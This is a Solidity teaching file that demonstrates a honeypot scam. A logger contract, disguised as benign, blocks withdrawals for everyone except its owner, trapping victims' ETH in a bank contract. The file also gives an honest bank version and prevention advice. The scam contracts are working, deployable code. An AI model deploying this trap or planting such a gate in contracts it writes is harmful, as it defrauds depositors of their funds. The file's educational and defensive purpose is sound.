// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title Honeypot
/// @notice Demonstrates a honeypot contract that traps user funds
/// @dev Educational example - DO NOT USE IN PRODUCTION
///
/// Attack pattern:
/// 1. Attacker deploys HoneypotLogger (they are the owner)
/// 2. Attacker deploys HoneypotBank, passing the logger address
/// 3. Attacker deposits some ETH to make the bank look legitimate
/// 4. Victim sees the bank contract, reviews deposit/withdraw — looks safe
/// 5. Victim deposits ETH
/// 6. Victim tries to withdraw — but the logger reverts for non-owners
/// 7. Victim's funds are permanently trapped
///
/// Prevention:
/// - Always verify ALL external contracts a contract interacts with
/// - Be suspicious of contracts that call external addresses in withdraw paths
/// - Use contracts with no external dependencies for critical fund operations

/// @notice Custom errors
error NotOwner(address caller, address owner);
error InsufficientDeposit(address caller, uint256 balance);
error WithdrawFailed(address to, uint256 amount);

/// @title HoneypotLogger - controlled by attacker to selectively block withdrawals
/// @notice This logger reverts for everyone except the owner (attacker)
/// @dev The key deception: this contract looks like an innocent event logger,
///      but it's actually a gatekeeper that blocks non-owner withdrawals.
contract HoneypotLogger {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Log function that selectively reverts
    /// @dev Reverts for non-owners, trapping their funds in HoneypotBank
    /// @param caller The address attempting the action
    function log(address caller) external view {
        // This is the trap: only the owner (attacker) can pass this check.
        // Everyone else's withdraw transaction reverts here.
        if (caller != owner) {
            revert NotOwner(caller, owner);
        }
    }
}

/// @title HoneypotBank - looks like a simple bank but traps non-owner funds
/// @notice A deceptive bank that calls an external logger before withdrawals
/// @dev The vulnerability is the external call to logger.log() in the withdraw path.
///      The logger is controlled by the attacker and selectively reverts.
contract HoneypotBank {
    mapping(address => uint256) public balances;
    HoneypotLogger public immutable logger;

    constructor(address _logger) {
        logger = HoneypotLogger(_logger);
    }

    /// @notice Deposit ETH into the bank
    /// @dev This works fine for everyone — it's designed to lure victims in
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraw ETH from the bank (TRAPPED by logger)
    /// @dev The logger.log() call reverts for non-owners, blocking withdrawal.
    ///      A casual code reviewer might overlook the logger as a benign logging call.
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        if (balance == 0) {
            revert InsufficientDeposit(msg.sender, 0);
        }

        // This external call is the trap — logger reverts for non-owners
        logger.log(msg.sender);

        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert WithdrawFailed(msg.sender, balance);
        }
    }
}

/// @title HonestBank - the secure version with no external dependencies
/// @notice A simple bank with no external calls in the withdraw path
/// @dev This is the pattern to follow: no external dependencies for fund operations
contract HonestBank {
    mapping(address => uint256) public balances;

    /// @notice Deposit ETH into the bank
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraw ETH from the bank (safe — no external calls)
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        if (balance == 0) {
            revert InsufficientDeposit(msg.sender, 0);
        }

        // Checks-effects-interactions: update state before sending ETH
        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert WithdrawFailed(msg.sender, balance);
        }
    }
}
